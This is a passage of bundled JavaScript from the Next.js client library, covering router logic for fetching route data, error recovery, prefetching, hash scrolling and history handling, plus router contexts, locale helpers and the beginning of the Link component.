	            // Passing the empty string here should be safe against future changes to the method.
	            // https://developer.mozilla.org/en-US/docs/Web/API/History/replaceState
	            '', as);
	        }
	    }
	    handleRouteInfoError(err, pathname, query, as, routeProps, loadErrorFail) {
	        var _this = this;
	        return _async_to_generator(function*() {
	            console.error(err);
	            if (err.cancelled) {
	                // bubble up cancellation errors
	                throw err;
	            }
	            if ((_routeLoader).isAssetError(err) || loadErrorFail) {
	                Router.events.emit('routeChangeError', err, as, routeProps);
	                // If we can't load the page it could be one of following reasons
	                //  1. Page doesn't exists
	                //  2. Page does exist in a different zone
	                //  3. Internal error while loading the page
	                // So, doing a hard reload is the proper way to deal with this.
	                handleHardNavigation({
	                    url: as,
	                    router: _this
	                });
	                // Changing the URL doesn't block executing the current code path.
	                // So let's throw a cancellation error stop the routing logic.
	                throw buildCancellationError();
	            }
	            try {
	                let props;
	                const { page: Component , styleSheets  } = yield _this.fetchComponent('/_error');
	                const routeInfo = {
	                    props,
	                    Component,
	                    styleSheets,
	                    err,
	                    error: err
	                };
	                if (!routeInfo.props) {
	                    try {
	                        routeInfo.props = yield _this.getInitialProps(Component, {
	                            err,
	                            pathname,
	                            query
	                        });
	                    } catch (gipErr) {
	                        console.error('Error in error page `getInitialProps`: ', gipErr);
	                        routeInfo.props = {};
	                    }
	                }
	                return routeInfo;
	            } catch (routeInfoErr) {
	                return _this.handleRouteInfoError((_isError).default(routeInfoErr) ? routeInfoErr : new Error(routeInfoErr + ''), pathname, query, as, routeProps, true);
	            }
	        })();
	    }
	    getRouteInfo({ route: requestedRoute , pathname , query , as , resolvedAs , routeProps , locale , hasMiddleware , isPreview , unstable_skipClientCache  }) {
	        var _this = this;
	        return _async_to_generator(function*() {
	            /**
	     * This `route` binding can change if there's a rewrite
	     * so we keep a reference to the original requested route
	     * so we can store the cache for it and avoid re-requesting every time
	     * for shallow routing purposes.
	     */ let route = requestedRoute;
	            try {
	                var ref, ref4, ref5;
	                const handleCancelled = getCancelledHandler({
	                    route,
	                    router: _this
	                });
	                let existingInfo = _this.components[route];
	                if (routeProps.shallow && existingInfo && _this.route === route) {
	                    return existingInfo;
	                }
	                if (hasMiddleware) {
	                    existingInfo = undefined;
	                }
	                let cachedRouteInfo = existingInfo && !('initial' in existingInfo) && process.env.NODE_ENV !== 'development' ? existingInfo : undefined;
	                const fetchNextDataParams = {
	                    dataHref: _this.pageLoader.getDataHref({
	                        href: (0, _formatUrl).formatWithValidation({
	                            pathname,
	                            query
	                        }),
	                        skipInterpolation: true,
	                        asPath: resolvedAs,
	                        locale
	                    }),
	                    hasMiddleware: true,
	                    isServerRender: _this.isSsr,
	                    parseJSON: true,
	                    inflightCache: _this.sdc,
	                    persistCache: !isPreview,
	                    isPrefetch: false,
	                    unstable_skipClientCache
	                };
	                const data = yield withMiddlewareEffects({
	                    fetchData: ()=>fetchNextData(fetchNextDataParams),
	                    asPath: resolvedAs,
	                    locale: locale,
	                    router: _this
	                });
	                handleCancelled();
	                if ((data == null ? void 0 : (ref = data.effect) == null ? void 0 : ref.type) === 'redirect-internal' || (data == null ? void 0 : (ref4 = data.effect) == null ? void 0 : ref4.type) === 'redirect-external') {
	                    return data.effect;
	                }
	                if ((data == null ? void 0 : (ref5 = data.effect) == null ? void 0 : ref5.type) === 'rewrite') {
	                    route = (0, _removeTrailingSlash).removeTrailingSlash(data.effect.resolvedHref);
	                    pathname = data.effect.resolvedHref;
	                    query = _extends({}, query, data.effect.parsedAs.query);
	                    resolvedAs = (0, _removeBasePath).removeBasePath((0, _normalizeLocalePath).normalizeLocalePath(data.effect.parsedAs.pathname, _this.locales).pathname);
	                    // Check again the cache with the new destination.
	                    existingInfo = _this.components[route];
	                    if (routeProps.shallow && existingInfo && _this.route === route && !hasMiddleware) {
	                        // If we have a match with the current route due to rewrite,
	                        // we can copy the existing information to the rewritten one.
	                        // Then, we return the information along with the matched route.
	                        return _extends({}, existingInfo, {
	                            route
	                        });
	                    }
	                }
	                if (route === '/api' || route.startsWith('/api/')) {
	                    handleHardNavigation({
	                        url: as,
	                        router: _this
	                    });
	                    return new Promise(()=>{});
	                }
	                const routeInfo = cachedRouteInfo || (yield _this.fetchComponent(route).then((res)=>({
	                        Component: res.page,
	                        styleSheets: res.styleSheets,
	                        __N_SSG: res.mod.__N_SSG,
	                        __N_SSP: res.mod.__N_SSP
	                    })));
	                if (process.env.NODE_ENV !== 'production') {
	                    const { isValidElementType  } = requireReactIs();
	                    if (!isValidElementType(routeInfo.Component)) {
	                        throw new Error(`The default export is not a React Component in page: "${pathname}"`);
	                    }
	                }
	                const shouldFetchData = routeInfo.__N_SSG || routeInfo.__N_SSP;
	                const { props , cacheKey  } = yield _this._getData(_async_to_generator(function*() {
	                    if (shouldFetchData) {
	                        const { json , cacheKey: _cacheKey  } = (data == null ? void 0 : data.json) ? data : yield fetchNextData({
	                            dataHref: _this.pageLoader.getDataHref({
	                                href: (0, _formatUrl).formatWithValidation({
	                                    pathname,
	                                    query
	                                }),
	                                asPath: resolvedAs,
	                                locale
	                            }),
	                            isServerRender: _this.isSsr,
	                            parseJSON: true,
	                            inflightCache: _this.sdc,
	                            persistCache: !isPreview,
	                            isPrefetch: false,
	                            unstable_skipClientCache
	                        });
	                        return {
	                            cacheKey: _cacheKey,
	                            props: json || {}
	                        };
	                    }
	                    return {
	                        headers: {},
	                        cacheKey: '',
	                        props: yield _this.getInitialProps(routeInfo.Component, // we provide AppTree later so this needs to be `any`
	                        {
	                            pathname,
	                            query,
	                            asPath: as,
	                            locale,
	                            locales: _this.locales,
	                            defaultLocale: _this.defaultLocale
	                        })
	                    };
	                }));
	                // Only bust the data cache for SSP routes although
	                // middleware can skip cache per request with
	                // x-middleware-cache: no-cache as well
	                if (routeInfo.__N_SSP && fetchNextDataParams.dataHref) {
	                    delete _this.sdc[cacheKey];
	                }
	                // we kick off a HEAD request in the background
	                // when a non-prefetch request is made to signal revalidation
	                if (!_this.isPreview && routeInfo.__N_SSG && process.env.NODE_ENV !== 'development') {
	                    fetchNextData(Object.assign({}, fetchNextDataParams, {
	                        isBackground: true,
	                        persistCache: false,
	                        inflightCache: backgroundCache
	                    })).catch(()=>{});
	                }
	                props.pageProps = Object.assign({}, props.pageProps);
	                routeInfo.props = props;
	                routeInfo.route = route;
	                routeInfo.query = query;
	                routeInfo.resolvedAs = resolvedAs;
	                _this.components[route] = routeInfo;
	                return routeInfo;
	            } catch (err) {
	                return _this.handleRouteInfoError((_isError).getProperError(err), pathname, query, as, routeProps);
	            }
	        })();
	    }
	    set(state, data, resetScroll) {
	        this.state = state;
	        return this.sub(data, this.components['/_app'].Component, resetScroll);
	    }
	    /**
	   * Callback to execute before replacing router state
	   * @param cb callback to be executed
	   */ beforePopState(cb) {
	        this._bps = cb;
	    }
	    onlyAHashChange(as) {
	        if (!this.asPath) return false;
	        const [oldUrlNoHash, oldHash] = this.asPath.split('#');
	        const [newUrlNoHash, newHash] = as.split('#');
	        // Makes sure we scroll to the provided hash if the url/hash are the same
	        if (newHash && oldUrlNoHash === newUrlNoHash && oldHash === newHash) {
	            return true;
	        }
	        // If the urls are change, there's more than a hash change
	        if (oldUrlNoHash !== newUrlNoHash) {
	            return false;
	        }
	        // If the hash has changed, then it's a hash only change.
	        // This check is necessary to handle both the enter and
	        // leave hash === '' cases. The identity case falls through
	        // and is treated as a next reload.
	        return oldHash !== newHash;
	    }
	    scrollToHash(as) {
	        const [, hash = ''] = as.split('#');
	        // Scroll to top if the hash is just `#` with no value or `#top`
	        // To mirror browsers
	        if (hash === '' || hash === 'top') {
	            handleSmoothScroll(()=>window.scrollTo(0, 0));
	            return;
	        }
	        // Decode hash to make non-latin anchor works.
	        const rawHash = decodeURIComponent(hash);
	        // First we check if the element by id is found
	        const idEl = document.getElementById(rawHash);
	        if (idEl) {
	            handleSmoothScroll(()=>idEl.scrollIntoView());
	            return;
	        }
	        // If there's no element with the id, we check the `name` property
	        // To mirror browsers
	        const nameEl = document.getElementsByName(rawHash)[0];
	        if (nameEl) {
	            handleSmoothScroll(()=>nameEl.scrollIntoView());
	        }
	    }
	    urlIsNew(asPath) {
	        return this.asPath !== asPath;
	    }
	    /**
	   * Prefetch page code, you may wait for the data during page rendering.
	   * This feature only works in production!
	   * @param url the href of prefetched page
	   * @param asPath the as path of the prefetched page
	   */ prefetch(url, asPath = url, options = {}) {
	        var _this = this;
	        return _async_to_generator(function*() {
	            if (typeof window !== 'undefined' && (_isBot).isBot(window.navigator.userAgent)) {
	                // No prefetches for bots that render the link since they are typically navigating
	                // links via the equivalent of a hard navigation and hence never utilize these
	                // prefetches.
	                return;
	            }
	            let parsed = (_parseRelativeUrl).parseRelativeUrl(url);
	            let { pathname , query  } = parsed;
	            if (process.env.__NEXT_I18N_SUPPORT) {
	                if (options.locale === false) {
	                    pathname = (_normalizeLocalePath).normalizeLocalePath(pathname, _this.locales).pathname;
	                    parsed.pathname = pathname;
	                    url = (_formatUrl).formatWithValidation(parsed);
	                    let parsedAs = (_parseRelativeUrl).parseRelativeUrl(asPath);
	                    const localePathResult = (_normalizeLocalePath).normalizeLocalePath(parsedAs.pathname, _this.locales);
	                    parsedAs.pathname = localePathResult.pathname;
	                    options.locale = localePathResult.detectedLocale || _this.defaultLocale;
	                    asPath = (_formatUrl).formatWithValidation(parsedAs);
	                }
	            }
	            const pages = yield _this.pageLoader.getPageList();
	            let resolvedAs = asPath;
	            const locale = typeof options.locale !== 'undefined' ? options.locale || undefined : _this.locale;
	            if (process.env.__NEXT_HAS_REWRITES && asPath.startsWith('/')) {
	                let rewrites;
	                ({ __rewrites: rewrites  } = yield (_routeLoader).getClientBuildManifest());
	                const rewritesResult = (_resolveRewrites).default((_addBasePath).addBasePath((_addLocale).addLocale(asPath, _this.locale), true), pages, rewrites, parsed.query, (p)=>resolveDynamicRoute(p, pages), _this.locales);
	                if (rewritesResult.externalDest) {
	                    return;
	                }
	                resolvedAs = (_removeLocale).removeLocale((_removeBasePath).removeBasePath(rewritesResult.asPath), _this.locale);
	                if (rewritesResult.matchedPage && rewritesResult.resolvedHref) {
	                    // if this directly matches a page we need to update the href to
	                    // allow the correct page chunk to be loaded
	                    pathname = rewritesResult.resolvedHref;
	                    parsed.pathname = pathname;
	                    url = (_formatUrl).formatWithValidation(parsed);
	                }
	            }
	            parsed.pathname = resolveDynamicRoute(parsed.pathname, pages);
	            if ((_isDynamic).isDynamicRoute(parsed.pathname)) {
	                pathname = parsed.pathname;
	                parsed.pathname = pathname;
	                Object.assign(query, (_routeMatcher).getRouteMatcher((_routeRegex).getRouteRegex(parsed.pathname))((_parsePath).parsePath(asPath).pathname) || {});
	                url = (_formatUrl).formatWithValidation(parsed);
	            }
	            // Prefetch is not supported in development mode because it would trigger on-demand-entries
	            if (process.env.NODE_ENV !== 'production') {
	                return;
	            }
	            const route = (_removeTrailingSlash).removeTrailingSlash(pathname);
	            yield Promise.all([
	                _this.pageLoader._isSsg(route).then((isSsg)=>{
	                    return isSsg ? fetchNextData({
	                        dataHref: _this.pageLoader.getDataHref({
	                            href: url,
	                            asPath: resolvedAs,
	                            locale: locale
	                        }),
	                        isServerRender: false,
	                        parseJSON: true,
	                        inflightCache: _this.sdc,
	                        persistCache: !_this.isPreview,
	                        isPrefetch: true,
	                        unstable_skipClientCache: options.unstable_skipClientCache || options.priority && !!process.env.__NEXT_OPTIMISTIC_CLIENT_CACHE
	                    }).then(()=>false) : false;
	                }),
	                _this.pageLoader[options.priority ? 'loadPage' : 'prefetch'](route), 
	            ]);
	        })();
	    }
	    fetchComponent(route) {
	        var _this = this;
	        return _async_to_generator(function*() {
	            const handleCancelled = getCancelledHandler({
	                route,
	                router: _this
	            });
	            try {
	                const componentResult = yield _this.pageLoader.loadPage(route);
	                handleCancelled();
	                return componentResult;
	            } catch (err) {
	                handleCancelled();
	                throw err;
	            }
	        })();
	    }
	    _getData(fn) {
	        let cancelled = false;
	        const cancel = ()=>{
	            cancelled = true;
	        };
	        this.clc = cancel;
	        return fn().then((data)=>{
	            if (cancel === this.clc) {
	                this.clc = null;
	            }
	            if (cancelled) {
	                const err = new Error('Loading initial props cancelled');
	                err.cancelled = true;
	                throw err;
	            }
	            return data;
	        });
	    }
	    _getFlightData(dataHref) {
	        // Do not cache RSC flight response since it's not a static resource
	        return fetchNextData({
	            dataHref,
	            isServerRender: true,
	            parseJSON: false,
	            inflightCache: this.sdc,
	            persistCache: false,
	            isPrefetch: false
	        }).then(({ text  })=>({
	                data: text
	            }));
	    }
	    getInitialProps(Component, ctx) {
	        const { Component: App  } = this.components['/_app'];
	        const AppTree = this._wrapApp(App);
	        ctx.AppTree = AppTree;
	        return (_utils).loadGetInitialProps(App, {
	            AppTree,
	            Component,
	            router: this,
	            ctx
	        });
	    }
	    get route() {
	        return this.state.route;
	    }
	    get pathname() {
	        return this.state.pathname;
	    }
	    get query() {
	        return this.state.query;
	    }
	    get asPath() {
	        return this.state.asPath;
	    }
	    get locale() {
	        return this.state.locale;
	    }
	    get isFallback() {
	        return this.state.isFallback;
	    }
	    get isPreview() {
	        return this.state.isPreview;
	    }
	    constructor(pathname1, query1, as1, { initialProps , pageLoader , App , wrapApp , Component , err , subscription , isFallback , locale , locales , defaultLocale , domainLocales , isPreview  }){
	        // Server Data Cache
	        this.sdc = {};
	        this.isFirstPopStateEvent = true;
	        this._key = createKey();
	        this.onPopState = (e)=>{
	            const { isFirstPopStateEvent  } = this;
	            this.isFirstPopStateEvent = false;
	            const state = e.state;
	            if (!state) {
	                // We get state as undefined for two reasons.
	                //  1. With older safari (< 8) and older chrome (< 34)
	                //  2. When the URL changed with #
	                //
	                // In the both cases, we don't need to proceed and change the route.
	                // (as it's already changed)
	                // But we can simply replace the state with the new changes.
	                // Actually, for (1) we don't need to nothing. But it's hard to detect that event.
	                // So, doing the following for (1) does no harm.
	                const { pathname , query  } = this;
	                this.changeState('replaceState', (_formatUrl).formatWithValidation({
	                    pathname: (_addBasePath).addBasePath(pathname),
	                    query
	                }), (_utils).getURL());
	                return;
	            }
	            // __NA is used to identify if the history entry can be handled by the app-router.
	            if (state.__NA) {
	                window.location.reload();
	                return;
	            }
	            if (!state.__N) {
	                return;
	            }
	            // Safari fires popstateevent when reopening the browser.
	            if (isFirstPopStateEvent && this.locale === state.options.locale && state.as === this.asPath) {
	                return;
	            }
	            let forcedScroll;
	            const { url , as , options , key  } = state;
	            if (process.env.__NEXT_SCROLL_RESTORATION) {
	                if (manualScrollRestoration) {
	                    if (this._key !== key) {
	                        // Snapshot current scroll position:
	                        try {
	                            sessionStorage.setItem('__next_scroll_' + this._key, JSON.stringify({
	                                x: self.pageXOffset,
	                                y: self.pageYOffset
	                            }));
	                        } catch (e) {}
	                        // Restore old scroll position:
	                        try {
	                            const v = sessionStorage.getItem('__next_scroll_' + key);
	                            forcedScroll = JSON.parse(v);
	                        } catch (e1) {
	                            forcedScroll = {
	                                x: 0,
	                                y: 0
	                            };
	                        }
	                    }
	                }
	            }
	            this._key = key;
	            const { pathname  } = (_parseRelativeUrl).parseRelativeUrl(url);
	            // Make sure we don't re-render on initial load,
	            // can be caused by navigating back from an external site
	            if (this.isSsr && as === (_addBasePath).addBasePath(this.asPath) && pathname === (_addBasePath).addBasePath(this.pathname)) {
	                return;
	            }
	            // If the downstream application returns falsy, return.
	            // They will then be responsible for handling the event.
	            if (this._bps && !this._bps(state)) {
	                return;
	            }
	            this.change('replaceState', url, as, Object.assign({}, options, {
	                shallow: options.shallow && this._shallow,
	                locale: options.locale || this.defaultLocale,
	                // @ts-ignore internal value not exposed on types
	                _h: 0
	            }), forcedScroll);
	        };
	        // represents the current component key
	        const route = (_removeTrailingSlash).removeTrailingSlash(pathname1);
	        // set up the component cache (by route keys)
	        this.components = {};
	        // We should not keep the cache, if there's an error
	        // Otherwise, this cause issues when when going back and
	        // come again to the errored page.
	        if (pathname1 !== '/_error') {
	            this.components[route] = {
	                Component,
	                initial: true,
	                props: initialProps,
	                err,
	                __N_SSG: initialProps && initialProps.__N_SSG,
	                __N_SSP: initialProps && initialProps.__N_SSP
	            };
	        }
	        this.components['/_app'] = {
	            Component: App,
	            styleSheets: []
	        };
	        // Backwards compat for Router.router.events
	        // TODO: Should be remove the following major version as it was never documented
	        this.events = Router.events;
	        this.pageLoader = pageLoader;
	        // if auto prerendered and dynamic route wait to update asPath
	        // until after mount to prevent hydration mismatch
	        const autoExportDynamic = (_isDynamic).isDynamicRoute(pathname1) && self.__NEXT_DATA__.autoExport;
	        this.basePath = process.env.__NEXT_ROUTER_BASEPATH || '';
	        this.sub = subscription;
	        this.clc = null;
	        this._wrapApp = wrapApp;
	        // make sure to ignore extra popState in safari on navigating
	        // back from external site
	        this.isSsr = true;
	        this.isLocaleDomain = false;
	        this.isReady = !!(self.__NEXT_DATA__.gssp || self.__NEXT_DATA__.gip || self.__NEXT_DATA__.appGip && !self.__NEXT_DATA__.gsp || !autoExportDynamic && !self.location.search && !process.env.__NEXT_HAS_REWRITES);
	        if (process.env.__NEXT_I18N_SUPPORT) {
	            this.locales = locales;
	            this.defaultLocale = defaultLocale;
	            this.domainLocales = domainLocales;
	            this.isLocaleDomain = !!(_detectDomainLocale).detectDomainLocale(domainLocales, self.location.hostname);
	        }
	        this.state = {
	            route,
	            pathname: pathname1,
	            query: query1,
	            asPath: autoExportDynamic ? pathname1 : as1,
	            isPreview: !!isPreview,
	            locale: process.env.__NEXT_I18N_SUPPORT ? locale : undefined,
	            isFallback
	        };
	        this._initialMatchesMiddlewarePromise = Promise.resolve(false);
	        if (typeof window !== 'undefined') {
	            // make sure "as" doesn't start with double slashes or else it can
	            // throw an error as it's considered invalid
	            if (!as1.startsWith('//')) {
	                // in order for `e.state` to work on the `onpopstate` event
	                // we have to register the initial route upon initialization
	                const options = {
	                    locale
	                };
	                const asPath = (_utils).getURL();
	                this._initialMatchesMiddlewarePromise = matchesMiddleware({
	                    router: this,
	                    locale,
	                    asPath
	                }).then((matches)=>{
	                    options._shouldResolveHref = as1 !== pathname1;
	                    this.changeState('replaceState', matches ? asPath : (_formatUrl).formatWithValidation({
	                        pathname: (_addBasePath).addBasePath(pathname1),
	                        query: query1
	                    }), asPath, options);
	                    return matches;
	                });
	            }
	            window.addEventListener('popstate', this.onPopState);
	            // enable custom scroll restoration handling when available
	            // otherwise fallback to browser's default handling
	            if (process.env.__NEXT_SCROLL_RESTORATION) {
	                if (manualScrollRestoration) {
	                    window.history.scrollRestoration = 'manual';
	                }
	            }
	        }
	    }
	}
	Router.events = (_mitt).default();
	router.default = Router;

	
	return router;
}

var routerContext = {};

var hasRequiredRouterContext;

function requireRouterContext () {
	if (hasRequiredRouterContext) return routerContext;
	hasRequiredRouterContext = 1;
	Object.defineProperty(routerContext, "__esModule", {
	    value: true
	});
	routerContext.RouterContext = void 0;
	var _interop_require_default = /*@__PURE__*/ require_interop_require_default().default;
	var _react = _interop_require_default(React__default);
	const RouterContext = _react.default.createContext(null);
	routerContext.RouterContext = RouterContext;
	if (process.env.NODE_ENV !== 'production') {
	    RouterContext.displayName = 'RouterContext';
	}

	
	return routerContext;
}

var appRouterContext = {};

var hasRequiredAppRouterContext;

function requireAppRouterContext () {
	if (hasRequiredAppRouterContext) return appRouterContext;
	hasRequiredAppRouterContext = 1;
	Object.defineProperty(appRouterContext, "__esModule", {
	    value: true
	});
	appRouterContext.TemplateContext = appRouterContext.GlobalLayoutRouterContext = appRouterContext.LayoutRouterContext = appRouterContext.AppRouterContext = void 0;
	var _interop_require_default = /*@__PURE__*/ require_interop_require_default().default;
	var _react = _interop_require_default(React__default);
	const AppRouterContext = _react.default.createContext(null);
	appRouterContext.AppRouterContext = AppRouterContext;
	const LayoutRouterContext = _react.default.createContext(null);
	appRouterContext.LayoutRouterContext = LayoutRouterContext;
	const GlobalLayoutRouterContext = _react.default.createContext(null);
	appRouterContext.GlobalLayoutRouterContext = GlobalLayoutRouterContext;
	const TemplateContext = _react.default.createContext(null);
	appRouterContext.TemplateContext = TemplateContext;
	if (process.env.NODE_ENV !== 'production') {
	    AppRouterContext.displayName = 'AppRouterContext';
	    LayoutRouterContext.displayName = 'LayoutRouterContext';
	    GlobalLayoutRouterContext.displayName = 'GlobalLayoutRouterContext';
	    TemplateContext.displayName = 'TemplateContext';
	}

	
	return appRouterContext;
}

var getDomainLocale = {exports: {}};

var normalizeLocalePath = {exports: {}};

var hasRequiredNormalizeLocalePath;

function requireNormalizeLocalePath () {
	if (hasRequiredNormalizeLocalePath) return normalizeLocalePath.exports;
	hasRequiredNormalizeLocalePath = 1;
	(function (module, exports) {
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.normalizeLocalePath = void 0;
		const normalizeLocalePath = (pathname, locales)=>{
		    if (process.env.__NEXT_I18N_SUPPORT) {
		        return requireNormalizeLocalePath$1().normalizeLocalePath(pathname, locales);
		    }
		    return {
		        pathname,
		        detectedLocale: undefined
		    };
		};
		exports.normalizeLocalePath = normalizeLocalePath;

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (normalizeLocalePath, normalizeLocalePath.exports));
	return normalizeLocalePath.exports;
}

var hasRequiredGetDomainLocale;

function requireGetDomainLocale () {
	if (hasRequiredGetDomainLocale) return getDomainLocale.exports;
	hasRequiredGetDomainLocale = 1;
	(function (module, exports) {
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.getDomainLocale = getDomainLocale;
		const basePath = process.env.__NEXT_ROUTER_BASEPATH || '';
		function getDomainLocale(path, locale, locales, domainLocales) {
		    if (process.env.__NEXT_I18N_SUPPORT) {
		        const normalizeLocalePath = requireNormalizeLocalePath().normalizeLocalePath;
		        const detectDomainLocale = requireDetectDomainLocale().detectDomainLocale;
		        const target = locale || normalizeLocalePath(path, locales).detectedLocale;
		        const domain = detectDomainLocale(domainLocales, undefined, target);
		        if (domain) {
		            const proto = `http${domain.http ? '' : 's'}://`;
		            const finalLocale = target === domain.defaultLocale ? '' : `/${target}`;
		            return `${proto}${domain.domain}${basePath}${finalLocale}${path}`;
		        }
		        return false;
		    } else {
		        return false;
		    }
		}

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (getDomainLocale, getDomainLocale.exports));
	return getDomainLocale.exports;
}

var hasRequiredLink$1;

function requireLink$1 () {
	if (hasRequiredLink$1) return link$1.exports;
	hasRequiredLink$1 = 1;
	(function (module, exports) {
		"client";
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.default = void 0;
		var _interop_require_default = /*@__PURE__*/ require_interop_require_default().default;
		var _object_without_properties_loose = /*@__PURE__*/ require_object_without_properties_loose().default;
		var _react = _interop_require_default(React__default);
		var _router = requireRouter();
		var _addLocale = requireAddLocale();
		var _routerContext = requireRouterContext();
		var _appRouterContext = requireAppRouterContext();
		var _useIntersection = requireUseIntersection();
		var _getDomainLocale = requireGetDomainLocale();
		var _addBasePath = requireAddBasePath();
		const prefetched = {};
		function prefetch(router, href, as, options) {
		    if (typeof window === 'undefined' || !router) return;
		    if (!(_router).isLocalURL(href)) return;
		    // Prefetch the JSON page if asked (only in the client)
		    // We need to handle a prefetch error here since we may be
		    // loading with priority which can reject but we don't
		    // want to force navigation since this is only a prefetch
		    Promise.resolve(router.prefetch(href, as, options)).catch((err)=>{
		        if (process.env.NODE_ENV !== 'production') {
		            // rethrow to show invalid URL errors
		            throw err;
		        }
		    });
		    const curLocale = options && typeof options.locale !== 'undefined' ? options.locale : router && router.locale;
		    // Join on an invalid URI character
		    prefetched[href + '%' + as + (curLocale ? '%' + curLocale : '')] = true;
		}
		function isModifiedEvent(event) {
		    const { target  } = event.currentTarget;
		    return target && target !== '_self' || event.metaKey || event.ctrlKey || event.shiftKey || event.altKey || event.nativeEvent && event.nativeEvent.which === 2;
		}
		function linkClicked(e, router, href, as, replace, shallow, scroll, locale, isAppRouter, prefetchEnabled) {
		    const { nodeName  } = e.currentTarget;
		    // anchors inside an svg have a lowercase nodeName
		    const isAnchorNodeName = nodeName.toUpperCase() === 'A';
		    if (isAnchorNodeName && (isModifiedEvent(e) || !(_router).isLocalURL(href))) {
		        // ignore click for browser’s default behavior
		        return;
		    }
		    e.preventDefault();
		    const navigate = ()=>{
		        // If the router is an NextRouter instance it will have `beforePopState`
		        if ('beforePopState' in router) {
		            router[replace ? 'replace' : 'push'](href, as, {
		                shallow,
		                locale,
		                scroll
		            });
		        } else {
		            // If `beforePopState` doesn't exist on the router it's the AppRouter.
		            const method = replace ? 'replace' : 'push';
		            router[method](href, {
		                forceOptimisticNavigation: !prefetchEnabled
		            });
		        }
		    };
		    if (isAppRouter) {
		        // @ts-expect-error startTransition exists.
		        _react.default.startTransition(navigate);
		    } else {
		        navigate();
		    }
		}
		const Link = /*#__PURE__*/ _react.default.forwardRef(function LinkComponent(props, forwardedRef) {
		    if (process.env.NODE_ENV !== 'production') {
		        function createPropError(args) {
		            return new Error(`Failed prop type: The prop \`${args.key}\` expects a ${args.expected} in \`<Link>\`, but got \`${args.actual}\` instead.` + (typeof window !== 'undefined' ? "\nOpen your browser's console to view the Component stack trace." : ''));
		        }
		        // TypeScript trick for type-guarding:
		        const requiredPropsGuard = {
		            href: true
		        };
		        const requiredProps = Object.keys(requiredPropsGuard);
		        requiredProps.forEach((key)=>{
		            if (key === 'href') {
		                if (props[key] == null || typeof props[key] !== 'string' && typeof props[key] !== 'object') {
		                    throw createPropError({
		                        key,
		                        expected: '`string` or `object`',
		                        actual: props[key] === null ? 'null' : typeof props[key]
		                    });
		                }
		            }
		        });
		        // TypeScript trick for type-guarding:
		        const optionalPropsGuard = {
		            as: true,
		            replace: true,
		            scroll: true,
		            shallow: true,
		            passHref: true,
		            prefetch: true,
		            locale: true,
		            onClick: true,
		            onMouseEnter: true,
		            onTouchStart: true,
		            legacyBehavior: true
		        };
		        const optionalProps = Object.keys(optionalPropsGuard);
		        optionalProps.forEach((key)=>{
		            const valType = typeof props[key];
		            if (key === 'as') {
		                if (props[key] && valType !== 'string' && valType !== 'object') {
		                    throw createPropError({
		                        key,
		                        expected: '`string` or `object`',
		                        actual: valType
		                    });
		                }
		            } else if (key === 'locale') {
		                if (props[key] && valType !== 'string') {
		                    throw createPropError({
		                        key,
		                        expected: '`string`',
		                        actual: valType
		                    });
		                }
		            } else if (key === 'onClick' || key === 'onMouseEnter' || key === 'onTouchStart') {
		                if (props[key] && valType !== 'function') {
		                    throw createPropError({
		                        key,
		                        expected: '`function`',
		                        actual: valType
		                    });
		                }
		            } else if (key === 'replace' || key === 'scroll' || key === 'shallow' || key === 'passHref' || key === 'prefetch' || key === 'legacyBehavior') {
		                if (props[key] != null && valType !== 'boolean') {
		                    throw createPropError({
		                        key,
		                        expected: '`boolean`',
		                        actual: valType
		                    });
		                }
		            } else ;
		        });
		        // This hook is in a conditional but that is ok because `process.env.NODE_ENV` never changes
		        // eslint-disable-next-line react-hooks/rules-of-hooks
		        const hasWarned = _react.default.useRef(false);
		        if (props.prefetch && !hasWarned.current) {
		            hasWarned.current = true;
		            console.warn('Next.js auto-prefetches automatically based on viewport. The prefetch attribute is no longer needed. More: https://nextjs.org/docs/messages/prefetch-true-deprecated');
		        }
		    }
		    let children;
		    const { href: hrefProp , as: asProp , children: childrenProp , prefetch: prefetchProp , passHref , replace , shallow , scroll , locale , onClick , onMouseEnter , onTouchStart , legacyBehavior =Boolean(process.env.__NEXT_NEW_LINK_BEHAVIOR) !== true  } = props, restProps = _object_without_properties_loose(props, [
		        "href",
		        "as",
		        "children",
		        "prefetch",
		        "passHref",
		        "replace",
		        "shallow",
		        "scroll",
		        "locale",
		        "onClick",
		        "onMouseEnter",
		        "onTouchStart",
		        "legacyBehavior"
		    ]);
		    children = childrenProp;
		    if (legacyBehavior && (typeof children === 'string' || typeof children === 'number')) {
		        children = /*#__PURE__*/ _react.default.createElement("a", null, children);
		    }
		    const p = prefetchProp !== false;
		    let router = _react.default.useContext(_routerContext.RouterContext);
		    // TODO-APP: type error. Remove `as any`
		    const appRouter = _react.default.useContext(_appRouterContext.AppRouterContext);
		    if (appRouter) {
		        router = appRouter;
		    }
		    const { href , as  } = _react.default.useMemo(()=>{
		        const [resolvedHref, resolvedAs] = (_router).resolveHref(router, hrefProp, true);
		        return {
		            href: resolvedHref,
		            as: asProp ? (_router).resolveHref(router, asProp) : resolvedAs || resolvedHref
		        };
		    }, [
		        router,
		        hrefProp,
		        asProp
		    ]);
		    const previousHref = _react.default.useRef(href);
		    const previousAs = _react.default.useRef(as);
		    // This will return the first child, if multiple are provided it will throw an error
		    let child;
		    if (legacyBehavior) {
		        if (process.env.NODE_ENV === 'development') {
		            if (onClick) {
		                console.warn(`"onClick" was passed to <Link> with \`href\` of \`${hrefProp}\` but "legacyBehavior" was set. The legacy behavior requires onClick be set on the child of next/link`);
		            }
		            if (onMouseEnter) {
		                console.warn(`"onMouseEnter" was passed to <Link> with \`href\` of \`${hrefProp}\` but "legacyBehavior" was set. The legacy behavior requires onMouseEnter be set on the child of next/link`);
		            }
		            try {
		                child = _react.default.Children.only(children);
		            } catch (err) {
		                if (!children) {
		                    throw new Error(`No children were passed to <Link> with \`href\` of \`${hrefProp}\` but one child is required https://nextjs.org/docs/messages/link-no-children`);
		                }
